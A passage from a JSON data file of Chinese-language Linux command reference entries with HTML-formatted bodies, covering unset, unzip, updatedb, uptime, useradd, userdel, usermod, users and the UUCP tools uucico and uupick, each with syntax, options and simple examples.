        "body": "<h1 id=\"unset\">unset</h1>\n<p>删除指定的shell变量或函数。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">unset <span class=\"hljs-selector-attr\">[-f]</span> <span class=\"hljs-selector-attr\">[-v]</span> <span class=\"hljs-selector-attr\">[-n]</span> <span class=\"hljs-selector-attr\">[name ...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>删除一到多个shell变量（不包括只读变量）。</li>\n<li>删除一到多个shell函数。</li>\n<li>删除一到多个具有引用属性的变量（如果-n选项存在）。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：仅删除函数。</span>\n<span class=\"hljs-deletion\">-v：仅删除变量（不包括只读变量）。</span>\n<span class=\"hljs-deletion\">-n：删除具有引用属性的变量名（如果该选项存在）。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>name（可选）：要删除的变量或函数。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非选项错误或要删除的变量或函数有只读属性。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 删除变量。</span>\n<span class=\"hljs-built_in\">declare</span> paper_size=<span class=\"hljs-string\">'B5'</span>\n<span class=\"hljs-built_in\">unset</span> -v paper_size\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 删除函数。</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">show_result</span>(<span class=\"hljs-params\"></span>)</span>{ <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'Last Command Return: $?'</span>; }\n<span class=\"hljs-keyword\">unset</span> -f show_result\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 当不指定选项时，优先删除变量，如果失败则删除函数。</span>\n<span class=\"hljs-keyword\">declare</span> -i aa=<span class=\"hljs-number\">100</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">aa</span>(<span class=\"hljs-params\"></span>)</span>{ <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'aa'</span>; }\n<span class=\"hljs-keyword\">unset</span> aa\n<span class=\"hljs-comment\"># 变量'aa'已被删除。</span>\n<span class=\"hljs-keyword\">declare</span> -p aa\n<span class=\"hljs-comment\"># 函数'aa'存在。</span>\n<span class=\"hljs-keyword\">declare</span> -F|grep aa\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 演示unset使用-n选项，name指定了引用变量时的情况。</span>\n<span class=\"hljs-built_in\">declare</span> a=3\n<span class=\"hljs-comment\"># 定义引用变量</span>\n<span class=\"hljs-built_in\">declare</span> -n b=a\n<span class=\"hljs-comment\"># 查看属性，显示declare -n b=\"a\"</span>\n<span class=\"hljs-built_in\">declare</span> -p b\n<span class=\"hljs-comment\"># 显示3</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${b}</span>\n<span class=\"hljs-comment\"># 显示a</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${!b}</span>\n<span class=\"hljs-comment\"># 指定-n选项时</span>\n<span class=\"hljs-built_in\">unset</span> -n b\n<span class=\"hljs-comment\"># 引用变量b已被删除</span>\n<span class=\"hljs-built_in\">declare</span> -p b\n<span class=\"hljs-comment\"># 被引用的变量a未被删除</span>\n<span class=\"hljs-built_in\">declare</span> -p a\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 演示unset不使用-n选项，name指定了引用变量时的情况。</span>\n<span class=\"hljs-built_in\">declare</span> a=3\n<span class=\"hljs-comment\"># 定义引用变量</span>\n<span class=\"hljs-built_in\">declare</span> -n b=a\n<span class=\"hljs-comment\"># 查看属性，显示declare -n b=\"a\"</span>\n<span class=\"hljs-built_in\">declare</span> -p b\n<span class=\"hljs-comment\"># 显示3</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${b}</span>\n<span class=\"hljs-comment\"># 显示a</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${!b}</span>\n<span class=\"hljs-comment\"># 不指定-n选项时</span>\n<span class=\"hljs-built_in\">unset</span> b\n<span class=\"hljs-comment\"># 引用变量b未被删除，显示declare -n b=\"a\"</span>\n<span class=\"hljs-built_in\">declare</span> -p b\n<span class=\"hljs-comment\"># 被引用的变量a被删除</span>\n<span class=\"hljs-built_in\">declare</span> -p a\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "unzip",
        "des": "用于解压缩由zip命令压缩的压缩包",
        "body": "<h1 id=\"unzip\">unzip</h1>\n<p>用于解压缩由zip命令压缩的压缩包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>unzip命令</strong> 用于解压缩由zip命令压缩的“.zip”压缩包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">unzip</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：将解压缩的结果显示到屏幕上，并对字符做适当的转换；</span>\n<span class=\"hljs-deletion\">-f：更新现有的文件；</span>\n<span class=\"hljs-deletion\">-l：显示压缩文件内所包含的文件；</span>\n<span class=\"hljs-deletion\">-p：与-c参数类似，会将解压缩的结果显示到屏幕上，但不会执行任何的转换；</span>\n<span class=\"hljs-deletion\">-t：检查压缩文件是否正确；</span>\n<span class=\"hljs-deletion\">-u：与-f参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-z：仅显示压缩文件的备注文字；</span>\n<span class=\"hljs-deletion\">-a：对文本文件进行必要的字符转换；</span>\n<span class=\"hljs-deletion\">-b：不要对文本文件进行字符转换；</span>\n<span class=\"hljs-deletion\">-C：压缩文件中的文件名称区分大小写；</span>\n<span class=\"hljs-deletion\">-j：不处理压缩文件中原有的目录路径；</span>\n<span class=\"hljs-deletion\">-L：将压缩文件中的全部文件名改为小写；</span>\n<span class=\"hljs-deletion\">-M：将输出结果送到more程序处理；</span>\n<span class=\"hljs-deletion\">-n：解压缩时不要覆盖原有的文件；</span>\n<span class=\"hljs-deletion\">-o：不必先询问用户，unzip执行后覆盖原有的文件；</span>\n<span class=\"hljs-deletion\">-P&lt;密码&gt;：使用zip的密码选项；</span>\n<span class=\"hljs-deletion\">-q：执行时不显示任何信息；</span>\n<span class=\"hljs-deletion\">-s：将文件名中的空白字符转换为底线字符；</span>\n<span class=\"hljs-deletion\">-V：保留VMS的文件版本信息；</span>\n<span class=\"hljs-deletion\">-X：解压缩时同时回存文件原来的UID/GID；</span>\n<span class=\"hljs-deletion\">-d&lt;目录&gt;：指定文件解压缩后所要存储的目录；</span>\n<span class=\"hljs-deletion\">-x&lt;文件&gt;：指定不要处理.zip压缩文件中的哪些文件；</span>\n<span class=\"hljs-deletion\">-Z：unzip-Z等于执行zipinfo指令。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>压缩包：指定要解压的“.zip”压缩包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将压缩文件text.zip在当前目录下解压缩。</p>\n<pre><code class=\"language-shell\">unzip <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">zip</span>\n</code></pre>\n<p>将压缩文件text.zip在指定目录<code>/tmp</code>下解压缩，如果已有相同的文件存在，要求unzip命令不覆盖原先的文件。</p>\n<pre><code class=\"language-shell\">unzip -<span class=\"hljs-keyword\">n</span> <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">zip</span> -<span class=\"hljs-keyword\">d</span> /tmp\n</code></pre>\n<p>查看压缩文件目录，但不解压。</p>\n<pre><code class=\"language-shell\">unzip -v <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">zip</span>\n</code></pre>\n<p>将压缩文件test.zip在指定目录<code>/tmp</code>下解压缩，如果已有相同的文件存在，要求unzip命令覆盖原先的文件。</p>\n<pre><code class=\"language-shell\">unzip -o <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">zip</span> -<span class=\"hljs-keyword\">d</span> tmp/\n</code></pre>\n<p>解压指定文件，* 用作通配符。</p>\n<pre><code class=\"language-shell\">unzip <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">zip</span> <span class=\"hljs-string\">\"*.jpg\"</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "updatedb",
        "des": "创建或更新slocate命令所必需的数据库文件",
        "body": "<h1 id=\"updatedb\">updatedb</h1>\n<p>创建或更新slocate命令所必需的数据库文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>updatedb命令</strong> 用来创建或更新slocate命令所必需的数据库文件。updatedb命令的执行过程较长，因为在执行时它会遍历整个系统的目录树，并将所有的文件信息写入slocate数据库文件中。</p>\n<p>补充说明：slocate本身具有一个数据库，里面存放了系统中文件与目录的相关信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">updatedb</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-o&lt;文件&gt;：忽略默认的数据库文件，使用指定的slocate数据库文件；</span>\n<span class=\"hljs-deletion\">-U&lt;目录&gt;：更新指定目录的slocate数据库；</span>\n<span class=\"hljs-deletion\">-v：显示执行的详细过程。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>实用updatedb命令的<code>-U</code>选项可以指定要更新slocate数据库的目录。</p>\n<pre><code class=\"language-shell\">updatedb -U <span class=\"hljs-regexp\">/usr/</span>local/  更新指定命令的slocate数据库\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "uptime",
        "des": "查看Linux系统负载信息",
        "body": "<h1 id=\"uptime\">uptime</h1>\n<p>查看Linux系统负载信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>uptime命令</strong> 能够打印系统总共运行了多长时间和系统的平均负载。uptime命令可以显示的信息显示依次为：现在时间、系统已经运行了多长时间、目前有多少登陆用户、系统在过去的1分钟、5分钟和15分钟内的平均负载。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">uptime</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-V：显示指令的版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用uptime命令查看系统负载：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@LinServ</span><span class=\"hljs-number\">-1</span> ~]<span class=\"hljs-meta\"># uptime -V    #显示uptime命令版本信息</span>\nprocps version <span class=\"hljs-number\">3.2</span><span class=\"hljs-number\">.7</span>\n\n[root<span class=\"hljs-symbol\">@LinServ</span><span class=\"hljs-number\">-1</span> ~]<span class=\"hljs-meta\"># uptime</span>\n <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">30</span> up <span class=\"hljs-number\">127</span> days,  <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">00</span>,  <span class=\"hljs-number\">1</span> user,  load average: <span class=\"hljs-number\">0.00</span>, <span class=\"hljs-number\">0.00</span>, <span class=\"hljs-number\">0.00</span>\n</code></pre>\n<p> <strong>显示内容说明：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">15</span>:<span class=\"hljs-number\">31</span>:<span class=\"hljs-number\">30</span>             # 系统当前时间\n<span class=\"hljs-attribute\">up</span> <span class=\"hljs-number\">127</span> days,&nbsp; <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">00</span>   # 主机已运行时间,时间越大，说明你的机器越稳定。\n<span class=\"hljs-attribute\">1</span> user               # 用户连接数，是总连接数而不是用户数\n<span class=\"hljs-attribute\">load</span> average: <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">00</span>         #  系统平均负载，统计最近<span class=\"hljs-number\">1</span>，<span class=\"hljs-number\">5</span>，<span class=\"hljs-number\">15</span>分钟的系统平均负载\n</code></pre>\n<p>那么什么是系统平均负载呢？ 系统平均负载是指在特定时间间隔内运行队列中的平均进程数。</p>\n<p>如果每个CPU内核的当前活动进程数不大于3的话，那么系统的性能是良好的。如果每个CPU内核的任务数大于5，那么这台机器的性能有严重问题。</p>\n<p>如果你的linux主机是1个双核CPU的话，当Load Average 为6的时候说明机器已经被充分使用了。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "useradd",
        "des": "创建的新的系统用户",
        "body": "<h1 id=\"useradd\">useradd</h1>\n<p>创建的新的系统用户</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>useradd命令</strong> 用于Linux中创建的新的系统用户。useradd可用来建立用户帐号。帐号建好之后，再用passwd设定帐号的密码．而可用userdel删除帐号。使用useradd指令所建立的帐号，实际上是保存在<code>/etc/passwd</code>文本文件中。</p>\n<p>在Slackware中，adduser指令是个script程序，利用交谈的方式取得输入的用户帐号资料，然后再交由真正建立帐号的useradd命令建立新用户，如此可方便管理员建立用户帐号。在Red Hat Linux中， <strong>adduser命令</strong> 则是useradd命令的符号连接，两者实际上是同一个指令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">useradd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c&lt;备注&gt;：加上备注文字。备注文字会保存在passwd的备注栏位中；</span>\n<span class=\"hljs-deletion\">-d&lt;登入目录&gt;：指定用户登入时的启始目录；</span>\n<span class=\"hljs-deletion\">-D：变更预设值；</span>\n<span class=\"hljs-deletion\">-e&lt;有效期限&gt;：指定帐号的有效期限；</span>\n<span class=\"hljs-deletion\">-f&lt;缓冲天数&gt;：指定在密码过期后多少天即关闭该帐号；</span>\n<span class=\"hljs-deletion\">-g&lt;群组&gt;：指定用户所属的群组；</span>\n<span class=\"hljs-deletion\">-G&lt;群组&gt;：指定用户所属的附加群组；</span>\n<span class=\"hljs-deletion\">-m：自动建立用户的登入目录；</span>\n<span class=\"hljs-deletion\">-M：不要自动建立用户的登入目录；</span>\n<span class=\"hljs-deletion\">-n：取消建立以用户名称为名的群组；</span>\n<span class=\"hljs-deletion\">-r：建立系统帐号；</span>\n<span class=\"hljs-deletion\">-s&lt;shell&gt;：指定用户登入后所使用的shell；</span>\n<span class=\"hljs-deletion\">-u&lt;uid&gt;：指定用户id。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：要创建的用户名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>新建用户加入组：</p>\n<pre><code class=\"language-shell\">useradd –g sales jack –G company,employees    <span class=\"hljs-regexp\">//</span>-g：加入主要组、-G：加入次要组\n</code></pre>\n<p>建立一个新用户账户，并设置ID：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">useradd</span> caojh -u <span class=\"hljs-number\">544</span>\n</code></pre>\n<p>需要说明的是，设定ID值时尽量要大于500，以免冲突。因为Linux安装后会建立一些特殊用户，一般0到499之间的值留给bin、mail这样的系统账号。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "userdel",
        "des": "用于删除给定的用户以及与用户相关的文件",
        "body": "<h1 id=\"userdel\">userdel</h1>\n<p>用于删除给定的用户以及与用户相关的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>userdel命令</strong> 用于删除给定的用户，以及与用户相关的文件。若不加选项，则仅删除用户帐号，而不删除相关文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">userdel</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：强制删除用户，即使用户当前已登录；</span>\n<span class=\"hljs-deletion\">-r：删除用户的同时，删除与用户相关的所有文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：要删除的用户名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>userdel命令很简单，比如我们现在有个用户linuxde，其家目录位于<code>/var</code>目录中，现在我们来删除这个用户：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">userdel</span> linuxde       <span class=\"hljs-comment\"># 删除用户linuxde，但不删除其家目录及文件；</span>\nuserdel -r linuxde    <span class=\"hljs-comment\"># 删除用户linuxde，其家目录及文件一并删除；</span>\n</code></pre>\n<p>请不要轻易用<code>-r</code>选项；他会删除用户的同时删除用户所有的文件和目录，切记如果用户目录下有重要的文件，在删除前请备份。</p>\n<p>其实也有最简单的办法，但这种办法有点不安全，也就是直接在<code>/etc/passwd</code>中删除您想要删除用户的记录；但最好不要这样做，<code>/etc/passwd</code>是极为重要的文件，可能您一不小心会操作失误。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "usermod",
        "des": "用于修改用户的基本信息",
        "body": "<h1 id=\"usermod\">usermod</h1>\n<p>用于修改用户的基本信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>usermod命令</strong> 用于修改用户的基本信息。usermod 命令不允许你改变正在线上的使用者帐号名称。当 usermod 命令用来改变user id，必须确认这名user没在电脑上执行任何程序。你需手动更改使用者的 crontab 档。也需手动更改使用者的 at 工作档。采用 NIS server 须在server上更动相关的NIS设定。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">usermod</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c&lt;备注&gt;：修改用户帐号的备注文字；</span>\n<span class=\"hljs-deletion\">-d&lt;登入目录&gt;：修改用户登入时的目录，只是修改/etc/passwd中用户的家目录配置信息，不会自动创建新的家目录，通常和-m一起使用；</span>\n<span class=\"hljs-deletion\">-m&lt;移动用户家目录&gt;:移动用户家目录到新的位置，不能单独使用，一般与-d一起使用。</span>\n<span class=\"hljs-deletion\">-e&lt;有效期限&gt;：修改帐号的有效期限；</span>\n<span class=\"hljs-deletion\">-f&lt;缓冲天数&gt;：修改在密码过期后多少天即关闭该帐号；</span>\n<span class=\"hljs-deletion\">-g&lt;群组&gt;：修改用户所属的群组；</span>\n<span class=\"hljs-deletion\">-G&lt;群组&gt;；修改用户所属的附加群组；</span>\n<span class=\"hljs-deletion\">-l&lt;帐号名称&gt;：修改用户帐号名称；</span>\n<span class=\"hljs-deletion\">-L：锁定用户密码，使密码无效；</span>\n<span class=\"hljs-deletion\">-s&lt;shell&gt;：修改用户登入后所使用的shell；</span>\n<span class=\"hljs-deletion\">-u&lt;uid&gt;：修改用户ID；</span>\n<span class=\"hljs-deletion\">-U:解除密码锁定。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>登录名：指定要修改信息的用户登录名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将 newuser2 添加到组 staff 中：</p>\n<pre><code class=\"language-shell\">usermod -G staff <span class=\"hljs-symbol\">newuser2</span>\n</code></pre>\n<p>修改newuser的用户名为newuser1：</p>\n<pre><code class=\"language-shell\">usermod -l <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">user1</span> <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">user</span>\n</code></pre>\n<p>锁定账号newuser1：</p>\n<pre><code class=\"language-shell\">usermod -L <span class=\"hljs-symbol\">newuser1</span>\n</code></pre>\n<p>解除对newuser1的锁定：</p>\n<pre><code class=\"language-shell\">usermod -U <span class=\"hljs-symbol\">newuser1</span>\n</code></pre>\n<p>增加用户到用户组中:</p>\n<pre><code class=\"language-shell\">apk add shadow <span class=\"hljs-comment\"># 安装 shadow 包, usermod 命令包含在 usermod 中</span>\nusermod -aG <span class=\"hljs-keyword\">group</span> <span class=\"hljs-title\">user</span> <span class=\"hljs-comment\"># 添加用户到用户组中</span>\n</code></pre>\n<p><code>-a</code> 参数表示附加，只和 <code>-G</code> 参数一同使用，表示将用户增加到组中。</p>\n<p>修改用户家目录：</p>\n<pre><code>[root@<span class=\"hljs-keyword\">node</span><span class=\"hljs-title\">-1</span> ~]<span class=\"hljs-comment\"># useradd lutixiaya</span>\n[root@<span class=\"hljs-keyword\">node</span><span class=\"hljs-title\">-1</span> ~]<span class=\"hljs-comment\"># ls /home</span>\nlutixiaya\n[root@<span class=\"hljs-keyword\">node</span><span class=\"hljs-title\">-1</span> ~]<span class=\"hljs-comment\"># usermod -md /data/new_home lutixiaya</span>\n[root@<span class=\"hljs-keyword\">node</span><span class=\"hljs-title\">-1</span> ~]<span class=\"hljs-comment\"># ls /home/</span>\n[root@<span class=\"hljs-keyword\">node</span><span class=\"hljs-title\">-1</span> ~]<span class=\"hljs-comment\"># ls /data/</span>\nnew_home\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "usernetctl",
        "des": "被允许时操作指定的网络接口",
        "body": "<h1 id=\"usernetctl\">usernetctl</h1>\n<p>被允许时操作指定的网络接口</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>usernetctl命令</strong> 在用于被允许时操作指定的网络接口。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">usernetctl</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  网络接口：被操纵的网络接口；</li>\n<li>  up：激活网络接口；</li>\n<li>  down：禁用网络接口；</li>\n<li>  report：报告网络接口状态。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "users",
        "des": "打印当前主机所有登陆用户的名称。",
        "body": "<h1 id=\"users\">users</h1>\n<p>打印当前主机所有登陆用户的名称。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">users [<span class=\"hljs-keyword\">OPTION</span>]... [<span class=\"hljs-keyword\">FILE</span>]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>每个显示的用户名对应一个登录会话；如果一个用户有不止一个登录会话，那他的用户名将显示相同的次数。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help       显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version    显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：记录用户当前登录情况的文件；默认使用 <code>/var/run/utmp</code> 、<code>/var/log/wtmp</code>。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># users</span>\nroot root\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 users</code>，<code>info coreutils 'users invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "uucico",
        "des": "UUCP文件传输服务程序",
        "body": "<h1 id=\"uucico\">uucico</h1>\n<p>UUCP文件传输服务程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>uucico命令</strong> 命令UUCP文件传输服务程序。 uucico是用来处理uucp或uux送到队列的文件传输工具。uucico有两种工作模式：主动模式和附属模式。当在主动模式下时，uucico会调用远端主机；在附属模式下时，uucico则接受远端主机的调用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">uucico <span class=\"hljs-selector-attr\">[-cCDefqvwz]</span><span class=\"hljs-selector-attr\">[-i&lt;类型&gt;]</span><span class=\"hljs-selector-attr\">[-I&lt;文件&gt;]</span><span class=\"hljs-selector-attr\">[-p&lt;连接端口号码&gt;]</span><span class=\"hljs-selector-attr\">[-]</span><span class=\"hljs-selector-attr\">[-rl]</span><span class=\"hljs-selector-attr\">[-s&lt;主机&gt;]</span><span class=\"hljs-selector-attr\">[-S&lt;主机&gt;]</span><span class=\"hljs-selector-attr\">[-u&lt;用户&gt;]</span><span class=\"hljs-selector-attr\">[-x&lt;类型&gt;]</span><span class=\"hljs-selector-attr\">[--help]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c或--quiet 当不执行任何工作时，不要更改记录文件的内容及更新目前的状态。</span>\n<span class=\"hljs-deletion\">-C或--ifwork 当有工作要执行时，才调用-s或-S参数所指定主机。</span>\n<span class=\"hljs-deletion\">-D或--nodetach 不要与控制终端机离线。</span>\n<span class=\"hljs-deletion\">-e或--loop 在附属模式下执行，并且出现要求登入的提示画面。</span>\n<span class=\"hljs-deletion\">-f或--force 当执行错误时，不等待任何时间即重新调用主机。</span>\n<span class=\"hljs-deletion\">-i&lt;类型&gt;或--stdin&lt;类型&gt; 当使用到标准输入设备时，指定连接端口的类型。</span>\n<span class=\"hljs-deletion\">-I&lt;文件&gt;--config&lt;文件&gt; 指定使用的配置文件。</span>\n<span class=\"hljs-deletion\">-l或--prompt 出现要求登入的提示画面。</span>\n<span class=\"hljs-deletion\">-p&lt;连接端口号码&gt;或-port&lt;连接端口号码&gt; 指定连接端口号码。</span>\n<span class=\"hljs-deletion\">-q或--quiet 不要启动uuxqt服务程序。</span>\n<span class=\"hljs-deletion\">-r0或--slave 以附属模式启动。</span>\n<span class=\"hljs-deletion\">-s&lt;主机&gt;或--system&lt;主机&gt; 调用指定的主机。</span>\n<span class=\"hljs-deletion\">-u&lt;用户&gt;或--login&lt;用户&gt; 指定登入的用户帐号，而不允许输入任意的登入帐号。</span>\n<span class=\"hljs-deletion\">-v或--version 显示版本信息，并且结束程序。</span>\n<span class=\"hljs-deletion\">-w或--wait 在主动模式下，当执行调用动作时，则出现要求登入的提示画面。</span>\n<span class=\"hljs-deletion\">-x&lt;类型&gt;或-X&lt;类型&gt;或outgoing-debug&lt;类型&gt; 启动指定的排错模式。</span>\n<span class=\"hljs-deletion\">-z或--try-next 当执行不成功时，尝试下一个选择而不结束程序。</span>\n<span class=\"hljs-deletion\">--help 显示帮助，并且结束程序。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>使用主动模式启动uucico服务。在命令提示符下直接输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">uucico</span>-<span class=\"hljs-built_in\">r1</span>\n</code></pre>\n<p>提示：该命令一般没有输出。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "uupick",
        "des": "命令处理传送进来的文件",
        "body": "<h1 id=\"uupick\">uupick</h1>\n<p>命令处理传送进来的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>uupick命令</strong> 处理传送进来的文件。 当其他主机通过UUCP将文件传送进来时，可利用uupick指令取出这些文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">uupick <span class=\"hljs-selector-attr\">[-v]</span><span class=\"hljs-selector-attr\">[-I&lt;配置文件&gt;]</span><span class=\"hljs-selector-attr\">[-s&lt;主机&gt;]</span><span class=\"hljs-selector-attr\">[-x&lt;层级&gt;]</span><span class=\"hljs-selector-attr\">[--help]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-I&lt;配置文件&gt;或<span class=\"hljs-comment\">--config&lt;配置文件&gt; 指定配置文件。</span>\n-s&lt;主机&gt;或<span class=\"hljs-comment\">--system&lt;主机&gt; 处理由指定主机传送过来的文件。</span>\n-v或<span class=\"hljs-comment\">--version 显示版本信息。</span>\n<span class=\"hljs-comment\">--help 显示帮助。</span>\n</code></pre>\n<h3 id=\"例子\">例子</h3>\n<p>处理由主机localhost传送过来的文件。在命令行直接输入如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">uupick-s localhost</span>\n</code></pre>\n<p>该命令通常没有输出。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "uuto",
        "des": "将文件传送到远端的UUCP主机",
